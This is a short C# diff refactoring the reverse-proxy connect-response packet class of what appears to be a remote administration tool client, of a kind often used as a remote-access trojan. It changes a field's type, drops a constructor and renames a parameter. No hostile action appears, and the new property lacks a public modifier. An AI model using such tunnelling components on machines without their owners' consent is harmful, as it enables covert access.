@@ -1,4 +1,5 @@
 ﻿using System;
+using System.Net;
 using xClient.Core.Networking;
 using xClient.Core.Packets;
 
@@ -11,21 +12,17 @@ namespace xClient.Core.ReverseProxy.Packets
 
         public bool IsConnected { get; set; }
 
-        public long LocalEndPoint { get; set; }
+        IPAddress LocalAddress { get; set; }
 
         public int LocalPort { get; set; }
 
         public string HostName { get; set; }
 
-        public ReverseProxyConnectResponse()
-        {
-        }
-
-        public ReverseProxyConnectResponse(int connectionId, bool isConnected, long localEndPoint, int localPort, string TargetServer)
+        public ReverseProxyConnectResponse(int connectionId, bool isConnected, IPAddress localAddress, int localPort, string targetServer)
         {
             this.ConnectionId = connectionId;
             this.IsConnected = isConnected;
-            this.LocalEndPoint = localEndPoint;
+            this.LocalAddress = localAddress;
             this.LocalPort = localPort;
             this.HostName = "";
 
@@ -34,7 +31,7 @@ namespace xClient.Core.ReverseProxy.Packets
                 try
                 {
                     //resolve the HostName of the Server
-                    System.Net.IPHostEntry entry = System.Net.Dns.GetHostEntry(TargetServer);
+                    System.Net.IPHostEntry entry = System.Net.Dns.GetHostEntry(targetServer);
                     if (entry != null && !String.IsNullOrEmpty(entry.HostName))
                     {
                         HostName = entry.HostName;
